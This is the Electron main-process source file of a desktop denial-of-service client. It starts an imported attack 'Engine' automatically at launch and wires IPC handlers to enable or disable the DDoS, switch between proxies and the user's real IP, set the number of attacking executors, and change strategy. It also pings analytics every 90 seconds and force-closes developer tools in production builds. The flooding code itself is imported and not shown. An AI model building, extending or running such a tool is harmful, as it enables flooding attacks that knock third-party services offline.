import { app, BrowserWindow, nativeTheme, ipcMain } from 'electron'
import path from 'path'
import os from 'os'

import { Engine } from '../src-worker/engine'

import { trackEvent, usr } from './analytics'

const { autoUpdater } = require('electron-updater')

// needed in case process is undefined under Linux
const platform = process.platform || os.platform()

try {
  if (platform === 'win32' && nativeTheme.shouldUseDarkColors === true) {
    require('fs').unlinkSync(path.join(app.getPath('userData'), 'DevTools Extensions'))
  }
} catch (_) { }

let mainWindow

function sendStatusToWindow (text) {
  try {
    console.log(text)
  } catch (err) {
    console.log(err)
  }
}
function createWindow () {
  /**
   * Initial window options
   */
  mainWindow = new BrowserWindow({
    icon: path.resolve(__dirname, 'icons/icon.png'), // tray icon
    width: 600,
    height: 900,
    useContentSize: true,
    webPreferences: {
      contextIsolation: false,
      // More info: /quasar-cli/developing-electron-apps/electron-preload-script
      nodeIntegration: true,
      nodeIntegrationInWorker: true
    }
  })

  mainWindow.setMenu(null)
  mainWindow.loadURL(process.env.APP_URL)
  if (process.env.DEBUGGING) {
  // if on DEV or Production with debug enabled
    mainWindow.webContents.openDevTools()
  } else {
    // we're on production; no access to devtools pls
    mainWindow.webContents.on('devtools-opened', () => {
      mainWindow.webContents.closeDevTools()
    })
  }

  mainWindow.on('closed', () => {
    mainWindow = null
  })

  usr.pageview('/', function (err) {
    console.log('pageview')
    console.log(err)
  })
  setInterval(() => usr.pageview('/', function (err) {
    console.log('pageview')
    console.log(err)
  }), 90000)

  const engine = new Engine()
  engine.setExecutorStartegy('automatic')

  const window = mainWindow
  engine.executionStartegy.on('atack', (data) => window.webContents.send('atack', data))
  engine.executionStartegy.on('error', (data) => window.webContents.send('error', data))
  engine.executionStartegy.on('automatic_executorsCountUpdate', (data) => window.webContents.send('executorsCountUpdate', data))

  // const doser = new Doser(true, 32)
  // const window = mainWindow
  // doser.listen('atack', (data) => console.log(data.log))
  // doser.listen('atack', (data) => window.webContents.send('atack', data))
  // doser.listen('error', (data) => window.webContents.send('error', data))
  // doser.start()

  engine.start()

  ipcMain.on('updateDDOSEnable', (event, arg) => {
    if (arg.newVal) {
      engine.start()
    } else {
      engine.stop()
    }
  })

  ipcMain.on('updateForceProxy', (event, arg) => {
    engine.config.useRealIP = !arg.newVal
  })

  ipcMain.on('updateStrategy', (event, arg) => {
    engine.setExecutorStartegy(arg.newVal)
    engine.executionStartegy.on('atack', (data) => window.webContents.send('atack', data))
    engine.executionStartegy.on('error', (data) => window.webContents.send('error', data))
    engine.executionStartegy.on('automatic_executorsCountUpdate', (data) => window.webContents.send('executorsCountUpdate', data))
  })

  ipcMain.on('updateMaxDosersCount', (event, arg) => {
    engine.executionStartegy.setExecutorsCount(arg.newVal)
  })

  ipcMain.on('installUpdate', () => {
    autoUpdater.quitAndInstall()
  })
}

autoUpdater.on('checking-for-update', () => {
  sendStatusToWindow('Checking for update...')
})
autoUpdater.on('update-available', (info) => {
  sendStatusToWindow('Update available.')
})
autoUpdater.on('update-not-available', (info) => {
  sendStatusToWindow('Update not available.')
})
autoUpdater.on('error', (err) => {
  sendStatusToWindow('Error in auto-updater. ' + err)
})
autoUpdater.on('download-progress', (progressObj) => {
  let log_message = 'Download speed: ' + progressObj.bytesPerSecond
  log_message = log_message + ' - Downloaded ' + progressObj.percent + '%'
  log_message = log_message + ' (' + progressObj.transferred + '/' + progressObj.total + ')'
  sendStatusToWindow(log_message)
})
autoUpdater.on('update-downloaded', (event, releaseNotes, releaseName) => {
  sendStatusToWindow('Update downloaded')
  const obj = {
    message: process.platform === 'win32' ? releaseNotes : releaseName
  }
  try {
    sendStatusToWindow(obj)
    mainWindow?.webContents.send('update', obj)
  } catch (err) {
    console.log(err)
  }
})

app.whenReady().then(createWindow)

function checkUpdates () {
  try {
    autoUpdater.checkForUpdates()
  } catch (err) {
    console.log(err, 'Error while checking update')
  }
}

app.on('ready', function () {
  checkUpdates()
  setInterval(() => {
    checkUpdates()
  }, 1000 * 60 * 60)
})

app.on('window-all-closed', () => {
  if (platform !== 'darwin') {
    app.quit()
  }
})

app.on('activate', () => {
  if (mainWindow === null) {
    createWindow()
  }
})
